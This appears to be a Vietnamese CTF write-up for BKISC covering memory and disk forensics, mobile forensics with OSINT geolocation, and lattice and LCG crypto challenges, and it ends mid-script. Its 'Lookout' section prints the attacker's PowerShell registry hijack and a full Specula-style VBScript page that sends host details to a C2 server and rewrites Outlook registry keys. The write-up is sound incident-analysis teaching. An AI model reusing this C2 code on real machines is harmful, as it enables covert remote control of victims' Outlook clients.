author: Azaki
published: published
created: 2026-05-10
description: Top 19
tags: Challenge, BKISC, CTF


![[Pasted image 20260510085227.png]]
# Forensic

## Beatiful Memory

I left my most precious memory here, can you find it?

---

Đầu tiên mình dùng Volatility để kiểm tra thông tin của dump
Kết quả cho thấy đây là memory dump của Windows 10 x64
![[Pasted image 20260509093805.png]]

Tiếp theo mình dùng `windows.pslist` để xem các process tại thời điểm dump
Trong danh sách process có nhiều tiến trình đáng chú ý như:
```text 
explorer.exe
msedge.exe
msedgewebview2.exe
M365Copilot.exe
DumpIt.exe
```

Đặc biệt, `DumpIt.exe` xuất hiện lúc gần cuối, đây là công cụ dùng để tạo memory dump. Trước thời điểm dump, có nhiều process `msedge.exe` và `msedgewebview2.exe` đang chạy, gợi ý rằng dữ liệu có thể nằm trong browser/WebView memory

Mình tiếp tục kiểm tra command line của các process liên quan đến Edge, WebView, Copilot và DumpIt và Output cho thấy có nhiều process dạng renderer
![[Pasted image 20260509094207.png]]

Renderer process thường chứa nội dung trang web hoặc dữ liệu text đang được hiển thị, nên đây là hướng đáng nghi. Tuy nhiên, dump từng renderer process sẽ khá lâu vì Edge có nhiều process con

Vì đã có format flag nên mình dùng `strings` để trích xuất chuỗi trong file dump rồi lọc bằng regex
![[Pasted image 20260509094752.png]]

Mình tìm được 2 flag nhưng đây chủ là fake flag để đánh lừa mình nên sau đó mình thử thêm UTF-16 little endian, vì Windows thường lưu nhiều chuỗi text ở dạng wide string
![[Pasted image 20260509095208.png]]
Và kết quả là mình lấy được flag

>Flag: BKISC{W3ll_M3mory_is_Str0nk_right_?}
---

## Lookout

While checking a monthly report sent by one of my employees, everything seemed ordinary. However, when I logged back in my mailbox the next day, something strange was happening on my computer

---

 Khi mở image bằng FTK Imager, trong profile người dùng:
```
C:\Users\BKISC
```

Có một số artifact đáng chú ý mà mình đã kiểm tra
```
Desktop
Downloads
AppData
Windows\System32\winevt
Windows\System32\config
```

Trong Desktop thấy các file:
![[Pasted image 20260510170923.png]]
```
capture.pcapng
chall.ad1
Obsidian.lnk
TORBRO~1.LNK
```

File `Obsidian.lnk` được kiểm tra bằng hex/strings. Nội dung cho thấy shortcut trỏ tới:
```
C:\Users\BKISC\AppData\Local\Programs\obsidian\Obsidian.exe
```
![[Pasted image 20260510171046.png]]

Không thấy dấu hiệu gọi các binary nguy hiểm như:
```
powershell.exe
cmd.exe
wscript.exe
mshta.exe
rundll32.exe
regsvr32.exe
```
Vì vậy, `Obsidian.lnk` không phải hướng chính

Entry `TORBRO~1.LNK` có vẻ là short name của
```
Tor Browser.lnk
```

Ngoài ra có một entry đã bị xóa hoặc chỉ còn dấu vết trong `$I30` là **report**
Điều này cho thấy từng tồn tại một file/thư mục tên `report`, có khả năng liên quan đến “monthly report”.

Tiếp đến mình mở `capture.pcapng` bằng Wireshark và xem
```
Statistics → Protocol Hierarchy
```
![[Pasted image 20260510171410.png]]
Kết quả cho thấy có nhiều HTTP/TLS traffic và một lượng lớn TCP data

Vì HTTP không mã hóa, tiến hành lọc
```
http.request
```
và tìm các request đáng ngờ.

Phát hiện máy nạn nhân kết nối tới máy nội bộ khác
```
192.168.1.145 --> 192.168.1.189
```
![[Pasted image 20260510172307.png]]

Tiếp đến mình filter `ip.src == 192.168.1.145 && http.request` và tìm đưuọc request đáng chú ý
![[Pasted image 20260510171923.png]]
Đây chính là file “report” đáng nghi.

Server trả về nội dung PowerShell được encode base64.
![[Pasted image 20260510172804.png]]
Decode base64 với Cyberchef
![[Pasted image 20260510173234.png]]

Sau khi decode, script thực hiện import registry để chỉnh cấu hình Outlook WebView
```powershell
$tempRegFile = [System.IO.Path]::GetTempFileName() + ".reg"

$regContent = @"
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{261B8CA9-3BAF-4BD0-B0C2-BF04286785C6}\iexplore]
"Flags"=dword:00000004

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]
"140C"=dword:00000000
"1200"=dword:00000000
"1201"=dword:00000003
"@

Set-Content -Path $tempRegFile -Value $regContent -Encoding Unicode
& reg.exe import "`"$tempRegFile`""
Remove-Item -Path $tempRegFile -Force
```

Các key registry bị chỉnh:
```
HKCU\SOFTWARE\Microsoft\Office\16.0\Outlook\Webview\Inbox
HKCU\SOFTWARE\Microsoft\Office\15.0\Outlook\Webview\Inbox
HKCU\SOFTWARE\Microsoft\Office\14.0\Outlook\Webview\Inbox
```

Giá trị quan trọng
```
url = http://192.168.1.189:8386/plugin/search/
security = yes
```
Điều này cho thấy attacker lợi dụng Outlook WebView để biến Inbox thành nơi load nội dung từ C2

Sau khi registry bị thay đổi, Outlook tự kết nối tới C2
![[Pasted image 20260511204103.png]]

C2 trả về HTML/VBScript có sử dụng các object nguy hiểm
```
window.external.OutlookApplication
Wscript.Shell
MSXML2.ServerXMLHTTP
```
![[Pasted image 20260511202513.png]]
```html
<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="refresh" content="10">
<meta http-equiv="Cache-Control" content=NO-CACHE, no-store, must-revalidate, max-age=0" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="EXPIRES" CONTENT="0">
<title>Outlook</title>
<style>
body {
overflow: hidden;
border: 0px;
padding: 0px;
margin: 0px;
}
</style>
<script id=clientEventHandlersVBS language=vbscript>
<!--
On Error Resume Next
Function GetEnvironment()
On Error Resume Next
Set sh = outlookapp.CreateObject("Wscript.Shell")
compname = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
usern = sh.ExpandEnvironmentStrings("%USERNAME%")
r = BaseDecode(compname & "|" & usern,1)
GetEnvironment = r
End Function
Function SetRegKey(subkey,value,valuetype)
On Error Resume Next
Set oL = outlookapp.CreateObject("Wscript.Shell")
ol.RegWrite subkey, value, valuetype
End Function
Function BaseDecode(value, LE)
On Error Resume Next
With outlookapp.CreateObject("Msxml2.DOMDocument").CreateElement("aux")
.DataType = "bin.base64"
if LE then
.NodeTypedValue = StrToBytes(value, "utf-16le", 2)
else
.NodeTypedValue = StrToBytes(value, "utf-8", 3)
end if
BaseDecode = .Text
End With
End Function
Function requestpage(uri, rR)
On Error Resume Next
vi = Left(outlookapp.version,4)
d = rR
set oP = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
oP.open "POST", uri,false
oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
oP.setRequestHeader "Content-Length", Len(d)
oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi
oP.setOption 2, 13056
oP.send Replace(d, vbLf, "")
requestpage = oP.responseText
End Function
Function StrToBytes(strn, cset, pos)
On Error Resume Next
With outlookapp.CreateObject("ADODB.Stream")
.Type = 2
.Charset = cset
.Open
.WriteText strn
.Position = 0
.Type = 1
.Position = pos
StrToBytes = .Read
.Close
End With
End function
O = ""
uriloc = "http://192.168.1.189:8386/plugin/search/"
Set outlookapp = window.external.OutlookApplication
Sub window_onload()
O = GetEnvironment()
rul = requestpage(uriloc, chr(34) & O & chr(34))
if not rul = "" Then
Set box = outlookapp.GetNameSpace("MAPI")
Set fold = box.GetDefaultFolder(9)
val1 = SetRegKey("HKCU\" & "Software\Microsoft\Office\" & Left(outlookapp.version,4) & "\Outlook\UserInfo" & "\" & "KEY", Split(rul,"||")(0), "REG_SZ")
val2 = SetRegKey("HKCU\Software\Microsoft\Office\" & Left(outlookapp.version,4) & "\Outlook\Webview\Inbox\URL", Split(rul,"||")(1), "REG_SZ")
val3 = SetRegKey("HKCU\Software\Microsoft\Internet Explorer\Styles\MaxScriptStatements", &Hffffffff, "REG_DWORD")
Set outlookapp.ActiveExplorer.CurrentFolder = fold
End if
End Sub
-->
</script>
</head>
<body>
<object classid="CLSID:0006F063-0000-0000-C000-000000000046" id="SpeculaViewID" data="" width="100%" height="100%"></object>
</body>
</html>
```
Đây là hành vi rất giống kỹ thuật **Outlook WebView C2**, còn được biết đến với kiểu tấn công tương tự **Specula**.

Máy nạn nhân gửi thông tin môi trường về C2
![[Pasted image 20260511203809.png]]

Decode với base64
![[Pasted image 20260511203941.png]]

Sau đó C2 trả về key và URL mới
![[Pasted image 20260511204212.png]]
![[Pasted image 20260511212706.png]]
Sau khi đã có key mình đã có giải mã các gói tin bị mã hóa 
![[Pasted image 20260511212926.png]]

Tại đây attacker đã thự thi lệnh liệt kê user 
![[Pasted image 20260511210007.png]]

Tiếp theo, attacker thực thi lệnh liệt kê file của user `BKISC`
![[Pasted image 20260511210547.png]]

Kết quả trả về có các file trong đó có file cần tìm là flag.py
![[Pasted image 20260511210218.png]]

C2 đọc nội dung file `flag.py`. Nội dung file là đoạn mã RC4
![[Pasted image 20260511210345.png]]

```python
# Just run the code to get the flag lol

def RC4(key : bytes, plaintext : bytes):
    S = list(range(256))
    j = 0

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]  

    i = j = 0
    ciphertext = []
    for char in plaintext:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]  
        t = (S[i] + S[j]) % 256
        k = S[t]
        ciphertext.append(char ^ k)

    return bytes(ciphertext)

key = b"lookalikechicken"
plaintext = b';fa\x98\xc9\x13\xc8\x89\xda\x04\xed\xb6\x19\x98\xfdgF-\x14S\xa8+\xf50\xc4p\xf90\xb2&j\x081'
print(RC4(key, plaintext).decode())
```

Đây không phải plaintext thật, mà là ciphertext cần giải mã bằng RC4 với key
```key
lookalikechicken
```

Sau khi đọc file, C2 còn thực hiện xóa file:
```
Delete file: C:\Users\BKISC\Desktop\flag.py - Success! 
```

Script giải mã
```python
from Crypto.Cipher import ARC4

key = b"lookalikechicken"
ciphertext = b';fa\x98\xc9\x13\xc8\x89\xda\x04\xed\xb6\x19\x98\xfdgF-\x14S\xa8+\xf50\xc4p\xf90\xb2&j\x081'

cipher = ARC4.new(key)
print(cipher.decrypt(ciphertext))
```

Decode và lấy flag
![[Pasted image 20260510173855.png]]

>Flag: BKISC{l0oK_Ou7_f0R_0u71o0k_C2!!!}
---

## Homework

My friend and I were sleeping in our online class, when the session ended in group chat our teacher said the deadline is tomorrow, but we don't know what it is. Can you help us ?

---

Vì nói tới phần mềm học onine nên mình đã vào `Users/KangTheConq/AppData/Roaming` thì tìm thấy có ứng dụng Zoom nên mình tin rằng khả năng cao đây chính alf phần mềm mà challage đang nói tới
![[Pasted image 20260509154648.png]]

Nhưng mình kiểm tra các thứ liên quan tới Zoom thì không thu được gì
![[Pasted image 20260509154829.png]]

Mình chuyển hướng sang tìm kiếm lịch sử vì đây có thể là nơi lưu lại dấu vết quan tọng
Truy cập vào đường dẫn `Users/KangTheConq/AppData/Local/Microsoft/Edge/User Data/Default` và xuất file History ra để xem
![[Pasted image 20260509154421.png]]

Tìm trong bản urls thì mình tìm được vài link Google Drive nhưng trong đó có 1 link đáng ngờ
![[Pasted image 20260509151410.png]]

Truy cập vào link Google Drive mình thu được một file tên là homework.rar giống như yêu cầu của challenge
![[Pasted image 20260509151503.png]]

Tải về và giải nén thì mình thu được 2 file
![[Pasted image 20260509151702.png]]

Và nội dung của file key.txt
```text
You have learnt magic in recent online course, the magic that turn a JPG to a PNG, find the key here and do the homework !!!
All you need is in this rar file.
```

Kiểm tra RAR kỹ hơn bằng `strings` thì thấy có dấu hiệu file/stream ẩn:
![[Pasted image 20260509150847.png]]

Đây là NTFS alternate stream / RAR service record bị ẩn. Khi trích xuất service record đó ra, lấy được nội dung
![[Pasted image 20260509153145.png]]

Tức là key AES-CBC là:
```
key = N3v3rG0n4G1v3UUPiv  = 5778a7db75851bc63d8deed06a5d894f
```

Dùng AES-CBC để encrypt  JPG thành PNG
```python
from pathlib import Path
from Crypto.Cipher import AES

key = b"N3v3rG0n4G1v3UUP"
iv = bytes.fromhex("5778a7db75851bc63d8deed06a5d894f")

data = Path("homework.jpg").read_bytes()

cipher = AES.new(key, AES.MODE_CBC, iv)
out = cipher.encrypt(data)

Path("homework_solved.png").write_bytes(out)
```

![[Pasted image 20260509153806.png]]


>Flag: BKISCTF{Y0u_G0t_A_F0r_Th1s_St3g4n0gr4phy_Cl4ss}
---

## The Interview

You are an undercover police officer, sent on a dangerous mission to bring down a fraudulent organization from the inside. Your only way in is to pose as a job applicant, and now, the company has contacted you for an interview. You unexpectedly gain access to the HR representative’s phone data. It is your chance to expose their secrets and take the entire operation down.

!!!WARNING: Need OSINT skills to complete the challenge

---
### Part 1

Trích xuất nội dung toàn bộ  SMS 
![[Pasted image 20260509181929.png]]

Hoặc xem thủ công trong `workdb/sms/mmssms.db`
![[Pasted image 20260510002523.png]]

Decode chuỗi và thu được flag 1 kèm gợi ý flag 2
```python
import base64

msgs = [
    "JgcLEwlEDhsWVAlFBQ0WTQQBBgAIFVcbHUwPBhAAEllcFh8GAAVMBgoPHAYNRRcABE0ZBxsLHRAeCgVC",
    "Nh0LEh9ECQYBGQkJDxFBDB4NTwsBDBgWUhULFgcDV1xUGA==",
    "NQABBUwIGgoYWEgEDQxBJFcFA04IDwEKUhULFlUERV8SVx8OFAgCA08dGx0GAhBIEwQXARtOAQkAQQ==",
    "Ig4cFV1eTys4PTsmGA5RHxUHHAYGEigCHQ4NDxBDQW9bRS0ZXRMVHTBaR0EROgEdVg==",
    "OgYAFUwCABtTBAkXF0hTV1A9BwtPEwQKAEwMAgZQVl9FWB4ADwUJAE8IUwcYAAABAAFQDg4DCl1XGwAVRBcaUEVZXBYGBw8VTAMOBBZaYg=="
]

key = b"ronaldoisthechampionofworldcup2026"

for m in msgs:
    data = base64.b64decode(m)
    out = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    print(out.decode())
```

![[Pasted image 20260509180607.png]]

> Flag 1: BKISC{f0renshit_mobile3s_is_v3ryy_345y_bu7
### Part 2

Tìm chương trình trò chơi mà hint đã đề cập và trong mục download mình tìm thấy chương trình khả nghi
![[Pasted image 20260509181027.png]]

Decompile APK bằng apktool
![[Pasted image 20260509173302.png]]

Sau khi decompile, tìm package chính của app:
```bash 
find spacerunner_apktool -type f | grep -Ei "bkisc|spacerunner|MainActivity"
```

Các file đáng chú ý:
```text
spacerunner_apktool/smali_classes3/com/bkisc/spacerunner/MainActivity.smali
spacerunner_apktool/smali_classes3/com/bkisc/spacerunner/GameView.smali
spacerunner_apktool/smali_classes3/com/bkisc/spacerunner/GameState.smali
spacerunner_apktool/smali_classes3/com/bkisc/spacerunner/Ship.smali
spacerunner_apktool/smali_classes3/com/bkisc/spacerunner/Asteroid.smali
```

`MainActivity` chỉ khởi tạo game, nên logic chính nằm trong `GameView` và `GameState`

Search các string trong package app
![[Pasted image 20260509174020.png]]

Kiểm tra đoạn code quanh đó
![[Pasted image 20260509174132.png]]
Nghĩa là Part 2 không hardcode trực tiếp trong `GameView`, mà được tạo bởi `GameState.getPart2()`

Dump các hàm liên quan trong GameState
![[Pasted image 20260509173514.png]]
Logic của nó là:
- fetchBufferPart(i) lấy từng chunk byte
- computeMagic(idx) tạo key XOR
- getPart2() XOR từng byte với key rồi convert thành ký tự

```python
chunks = [
    [0x4c, 0x42, 0x2c, 0x0d, 0x20],
    [0x45, 0x77, 0x1d, 0x27, 0x59],
    [0x26, 0x00, 0x7d, 0x50, 0x1d],
    [0x01, 0x66, 0x5a, 0x76, 0x07],
    [0x4c, 0x59, 0x76, 0x1d, 0x66],
    [0x45, 0x27, 0x36, 0x7a, 0x44],
    [0x1d, 0x07, 0x23, 0x43, 0x1d],
]

key = [0x13, 0x37, 0x42, 0x69]

out = []

for i, chunk in enumerate(chunks):
    for j, b in enumerate(chunk):
        idx = i * 5 + j
        out.append(b ^ key[idx % 4])

print(bytes(out).decode())
```

![[Pasted image 20260509173749.png]]

>Flag 2: `_und3r5t4nding_hum4n_n4ture_is_n0t_`

Và mình cũng tìm được hint cho part 3 trong file History
![[Pasted image 20260510002803.png]]

Hint yêu cầu mình tìm tài khoản mạng xã hội của cô ấy
![[Pasted image 20260509183220.png]]
### Part 3

Để tìm được account media trước tiên mình cần có thông tin về user như email, username hoặc SĐT nên mình vào đường dẫn `/data/com.google.android.gm/databases/user_accounts` để tìm user account và tìm được email là thuminh689099@gmail.com
![[Pasted image 20260511075040.png]]

Mình dùng email vừa tìm để tìm được tài khoản instargram và thấy được hint là tìm nơi khác có thể là nền tản mạng xã hội khác
![[Pasted image 20260509211239.png]]

Vì thế mình dùng holehe để tìm với email thuminh689099@gmail.com và tìm được tài khoản twitter (X) 
![[Pasted image 20260509210339.png]]

Khi truy cập X với tên giống với trên Instargram mình tìm đưuọc tài khoản với 2 post 
![[Pasted image 20260509210841.png]]

Và mình cần phải tìm được tọa độ zz.zzz,yy.yyy được đề cập để làm mật khẩu mở Pastebin
![[Pasted image 20260509211105.png]]

![[Pasted image 20260510085105.png]]

Sau khi tìm một lúc trên nhiều nền tản thì mình tìm thấy 1 account TikTok của user **thuminh689099** và được yêu cầu tìm địa điểm của văn phòng
![[Pasted image 20260510094044.png]]

Video này cung cấp cho mình 2 ảnh góc nhìn phía trên và dưới của địa điểm
![[Pasted image 20260510090008.png]]

Ở bức thứ nhất mình tìm ra được toàn nhà ở đằng xa là của **Đại Học Quốc Tế Hồng Bàng** 
![[Pasted image 20260510093125.png]]

![[Pasted image 20260510095743.png]]

Với góc nhìn trên cao mình đã xác định được góc chụp của bức ảnh và xác định được tòa nhà thứ 2 
![[Pasted image 20260510093246.png]]

Toàn nhà này chính là **Đại học Kinh tế Tài chính TP.HCM (UEF) - Cơ sở 2**
![[Pasted image 20260510093303.png]]

Sau khi đã xác định góc chụp mình khoanh vùng theo hướng của 2 toàn nhà
- Tòa **Đại Học Quốc Tế Hồng Bàng** mình thấy được 1 phần bên phải của toàn nhà nên góc chuoj sẽ nghiên về hướng bên phải
- Tòa **Đại học Kinh tế Tài chính TP.HCM (UEF) - Cơ sở 2** thì mình nhìn được toàn bộ mặt bển phải của tòa
Từ dữ kiện trên mình khoanh vùn được khu vực chụp là các con hẻm trong khu này
![[Pasted image 20260510092809.png]]

Và khi xem street view ở Hẻm 236/29 Điện Biên Phủ mình tìm được chõ của bức ảnh thứ 2 trên TikTok nên mình khác chắc đây là điểm cần tìm
![[Pasted image 20260510092551.png]]

Khi quan sát xung quanh chỗ vừa tìm mình tìm thấy căng nhà có trong ảnh 1 của TikTok
![[Pasted image 20260510093413.png]]

Chính là căn này trong ảnh
![[Pasted image 20260510093501.png]]

Từ đó mà mình xác định được tọa độ cần tìm
![[Pasted image 20260510085039.png]]

Dùng **10.798,106.708** làm mật khẩu để mở Pastebin và lấy flag 3
![[Pasted image 20260510084857.png]]

>Flag: BKISC{f0renshit_mobile3s_is_v3ryy_345y_bu7_und3r5t4nding_hum4n_n4ture_is_n0t_s0_be_c4uti0us_e5peci4lly_w1th_BKISCmembers}
---
# OSINT

## Slash Slash Slash

My friend invited me to his house, but ...
Flag format: BKISC{latitude,longitude} (rounded to 4 decimal places).
Example: BKISC{1.2345,6.7890}

---

![[image.png]]

Dùng bản đồ huy hoạch thị trấn nhà Bè để tìm kiếm theo số nhà `1806/127/2/6/15/48/5 Huỳnh Tấn Phát` 
![[Pasted image 20260510202642.png]]

Và tìm được được tọa độ cần tìm
![[Pasted image 20260510202810.png]]

![[Pasted image 20260510203044.png]]

>Flag: BKISC{10.6949,106.7353}
---

# Crypto

## LCG in LCG

An LCG with a single (a,b) pair alone is not secure enough. So I decided to do many of them!

---

Challenge tạo một LCG nhưng mỗi lần sinh số sẽ chọn một cặp `(a, b)` khác nhau trong `list_ab`:
```python
SIZE = 10p = getPrime(256)list_ab = [(random.randint(1,p),random.randint(1,p)) for _ in range(SIZE)]
```

Mỗi lần gọi `next()`:
```python
a,b = list_ab[self.curr]self.s = (a * self.s + b) % self.m
```

Tức là trạng thái chính `s` được update bằng công thức affine:
```text
s_next = a_i * s + b_i mod p
```

Sau đó, biến `curr` được đổi bằng một LCG phụ:
```python
self.seed_shuffle = (self.a_shuffle * self.seed_shuffle + self.b_shuffle) % self.p_shuffleself.curr = self.seed_shuffle % SIZE
```

Cuối cùng challenge leak 30 trạng thái đầy đủ:
```python
leak = [c.next() for _ in range(30)]
```

Và dùng các byte thấp tiếp theo để xor flag:
```python
ct = [(c.next() & 0xFF) ^ FLAG[i] for i in range(len(FLAG))]
```

Điểm yếu là ta có **30 output đầy đủ modulo `p`**, không chỉ vài bit thấp. Vì vậy ta có thể recover được các affine map xuất hiện nhiều lần trong sequence.

Nếu hai transition dùng cùng một cặp `(a, b)`, ta có:
```text
y1 = a*x1 + b mod py2 = a*x2 + b mod p
```

Trừ hai phương trình:
```text
y1 - y2 = a * (x1 - x2) mod p
```

Suy ra:
```text
a = (y1 - y2) * inverse(x1 - x2, p) mod p
```

Sau khi có `a`, tìm `b`:
```text
b = y1 - a*x1 mod p
```

Vì `p` là prime nên gần như mọi `x1 - x2` khác 0 đều nghịch đảo được.

Ta có danh sách leak:
```text
leak[0], leak[1], leak[2], ..., leak[29]
```

Mỗi cặp liên tiếp tạo thành một transition:
```python
pairs = list(zip(leak, leak[1:]))
```

Tức là:
```text
pairs[0] = leak[0] -> leak[1]
pairs[1] = leak[1] -> leak[2]
...
pairs[28] = leak[28] -> leak[29]
```

Nếu hai `pairs[i]` và `pairs[j]` dùng cùng `(a,b)`, ta recover được `(a,b)` bằng công thức ở trên.

Sau khi recover thử `(a,b)`, ta kiểm tra nó đúng với bao nhiêu transition:
```python
if (a * x + b - y) % p == 0:    group.append(k)
```

Nếu một map đúng với nhiều transition, khả năng cao đó là một map thật.

Sau khi group các transition, ta thấy các map lặp theo chu kỳ 7:
```text
(0, 7, 14, 21, 28)
(1, 4, 5, 8, 11, 12, 15, 18, 19, 22, 25, 26)
(2, 9, 16, 23)
(3, 10, 17, 24)
(6, 13, 20, 27)
```

Nghĩa là ta có thể dự đoán map tiếp theo bằng:
```python
map_index = k % 7
```

Lưu ý nhóm thứ hai có nhiều residue khác nhau:
```text
1, 4, 5 mod 7
```

Điều đó nghĩa là tại các vị trí đó, `curr` chọn cùng một cặp `(a,b)`.

Sau khi leak 30 state, trạng thái hiện tại là:
```python
s = leak[-1]
```

Encryption bắt đầu ngay sau đó. Với mỗi byte ciphertext, challenge gọi:
```python
c.next() & 0xff
```

Nên ta chỉ cần tiếp tục sinh state rồi lấy byte thấp:
```python
s = (a * s + b) % pkey_byte = s & 0xff
```

Sau đó giải xor
```python
flag_byte = ct_byte ^ key_byte
```

```python
import ast
import re
from pathlib import Path
from itertools import combinations

src = Path("chal.py").read_text()

def grab(name):
    # đọc dòng dạng: # leak = [...]
    m = re.search(rf"^#\s*{name}\s*=\s*(.+)$", src, re.MULTILINE)
    if not m:
        raise SystemExit(f"Không tìm thấy '# {name} = ...' trong chal.py")
    return ast.literal_eval(m.group(1))

p = grab("p")
leak = grab("leak")
ct = grab("ct")

pairs = list(zip(leak, leak[1:]))

def fit(pair1, pair2):
    x1, y1 = pair1
    x2, y2 = pair2
    a = (y1 - y2) * pow(x1 - x2, -1, p) % p
    b = (y1 - a * x1) % p
    return a, b

maps = {}

for i, j in combinations(range(len(pairs)), 2):
    try:
        a, b = fit(pairs[i], pairs[j])
    except ValueError:
        continue

    group = []
    for k, (x, y) in enumerate(pairs):
        if (a * x + b - y) % p == 0:
            group.append(k)

    if len(group) >= 3:
        for r in {k % 7 for k in group}:
            maps[r] = (a, b)

print("[+] recovered residues:", sorted(maps))

s = leak[-1]
keystream = []

for k in range(29, 29 + len(ct)):
    a, b = maps[k % 7]
    s = (a * s + b) % p
    keystream.append(s & 0xff)

flag = bytes(c ^ k for c, k in zip(ct, keystream))
print(flag.decode())
```

![[Pasted image 20260509101839.png]]

>Flag: BKISC{0h_n0_cycl1c_lc6_br34k_my_lc6} 
---

## Crypto For Kindergarten

Let solve some basic math problems

---

Server sinh một secret dài 256 bytes.  
Gọi secret cần tìm là `S`. Vì secret dài 256 bytes nên
$$  
0 \leq S < 2^{2048}  
$$
Mỗi lần query, server sinh một prime 32-bit `p`, rồi trả về một residue `r`.  
  
Tuy nhiên `r` không cố định là `S mod p`, mà có thể bị đổi dấu ngẫu nhiên:  
$$  
r \equiv S \pmod p  
$$
hoặc:  
$$  
r \equiv -S \pmod p  
$$
Server cho tổng cộng 75 lượt menu. Vì cần 1 lượt cuối để verify secret, ta có thể dùng 74 lượt để query lấy các cặp `(p_i, r_i)`.  
  
Nếu biết chính xác dấu của từng residue, ta có thể dùng CRT để khôi phục `S`.  
  
Với khoảng 74 prime 32-bit, tích các modulus là:  
$$  
M = \prod_i p_i \approx 2^{32 \cdot 74} = 2^{2368}  
$$
Trong khi đó:  
$$  
S < 2^{2048}  
$$
Do đó:  
$$  
M > S  
$$
Vì vậy nếu có hệ đồng dư đúng dấu, CRT sẽ cho ra duy nhất secret thật, không chỉ là `S mod M`.  
Vấn đề chính là mỗi residue bị random dấu.  

Giả sử ban đầu ta coi toàn bộ residue nhận được là đúng dấu.  
Ta tính:  
$$  
x_0 = CRT(r_i \bmod p_i)  
$$
Tức là:  
$$  
x_0 \equiv r_i \pmod {p_i}  
$$
Nếu tại vị trí `i`, residue thật cần đổi từ `r_i` sang `-r_i`, thì thay đổi trên modulo `p_i` là:  
$$  
-2r_i \pmod {p_i}  
$$
Ta dựng một giá trị `Delta_i` sao cho:  
$$  
\Delta_i \equiv -2r_i \pmod {p_i}  
$$
và với mọi `j != i`:  
$$  
\Delta_i \equiv 0 \pmod {p_j}  
$$
Khi đó, việc chọn dấu cho từng residue tương đương với chọn các bit:  
$$  
e_i \in \{0, 1\}  
$$
và tạo ra candidate:  
$$  
X = x_0 + \sum_i e_i \Delta_i \pmod M  
$$
Ta cần tìm vector bit `e_i` sao cho:  
$$  
0 \leq X < 2^{2048}  
$$
Đây là một bài toán subset sum.  

Ta chuyển bài toán subset sum sang lattice.  
Ý tưởng là dựng lattice sao cho vector gần target sẽ tương ứng với một cách chọn các bit `e_i`.  
Dùng ma trận dạng
$$  
\begin{bmatrix}  
K & 0 & 0 & \cdots & \Delta_1 \\  
0 & K & 0 & \cdots & \Delta_2 \\  
0 & 0 & K & \cdots & \Delta_3 \\  
\vdots & \vdots & \vdots & \ddots & \vdots \\  
0 & 0 & 0 & \cdots & M  
\end{bmatrix}  
$$
Trong đó `K` là hệ số scale lớn, thường chọn gần kích thước secret:  
$$  
K = 2^{2048}  
$$
Target vector là:  
$$  
\left(  
\frac K2,  
\frac K2,  
\dots,  
\frac K2,  
-x_0  
\right)  
$$
Sau đó chạy LLL và CVP để tìm vector gần target.  
Các tọa độ đầu giúp ép hệ số về dạng gần `0` hoặc `1`, còn tọa độ cuối giúp ép:  
$$  
x_0 + \sum_i e_i \Delta_i \equiv 0 \pmod M  
$$
Kết quả thu được là một candidate cho secret.  

Sau khi có candidate `X`, kiểm tra lại với tất cả cặp `(p_i, r_i)`:  
$$  
X \bmod p_i = r_i  
$$
hoặc:  
$$  
X \bmod p_i = -r_i  
$$
Đồng thời candidate phải thỏa:  
$$  
0 \leq X < 2^{2048}  
$$
Nếu thỏa tất cả điều kiện trên, `X` chính là secret.  
  
Cuối cùng chuyển `X` về hex đủ 256 bytes rồi gửi vào option verify.  
Ta có nhiều modulus 32-bit.  
Với 74 query:  
$$  
\prod_i p_i \approx 2^{2368}  
$$
Không gian secret chỉ có kích thước:  
$$  
2^{2048}  
$$
Vì tích modulus lớn hơn rất nhiều so với secret, nghiệm đúng nằm trong một khoảng nhỏ so với modulo tổng `M`.  
Random dấu làm bài toán khó hơn, nhưng nó chỉ tạo ra lựa chọn nhị phân cho mỗi query.  
Các lựa chọn nhị phân này có thể được biểu diễn thành subset sum bằng các giá trị `Delta_i`.  
Lattice reduction giải subset sum này đủ nhanh vì số chiều chỉ khoảng 75

```python
#!/usr/bin/env python3
import re
import sys
import time

try:
    import websocket
except ImportError:
    raise SystemExit("Missing: pip install websocket-client")

try:
    from fpylll import IntegerMatrix, LLL, CVP
except ImportError:
    raise SystemExit("Missing: pip install fpylll cysignals")

SECRET_BYTES = 256
SECRET_BITS = SECRET_BYTES * 8
QUERY_COUNT = 74
PROMPT_TIMEOUT = 20.0
PAIR_RE = re.compile(r"\(p,\s*r\)\s*=\s*\((\d+),\s*(\d+)\)")


def recv_until(ws, needle=None, regex=None, timeout=PROMPT_TIMEOUT):
    end = time.time() + timeout
    data = ""
    while time.time() < end:
        ws.settimeout(max(0.1, end - time.time()))
        chunk = ws.recv()
        if isinstance(chunk, bytes):
            chunk = chunk.decode(errors="replace")
        data += chunk
        if needle is not None and needle in data:
            return data
        if regex is not None and regex.search(data):
            return data
    raise TimeoutError(f"Timed out; got: {data!r}")


def crt(residues, moduli):
    M = 1
    for p in moduli:
        M *= p

    x = 0
    for r, p in zip(residues, moduli):
        m = M // p
        x = (x + r * m * pow(m, -1, p)) % M
    return x, M


def dedupe_pairs(pairs):
    seen = {}
    for p, r in pairs:
        if p not in seen:
            seen[p] = r % p
    return [(p, r) for p, r in seen.items()]


def valid_candidate(x, pairs):
    if not (0 <= x < (1 << SECRET_BITS)):
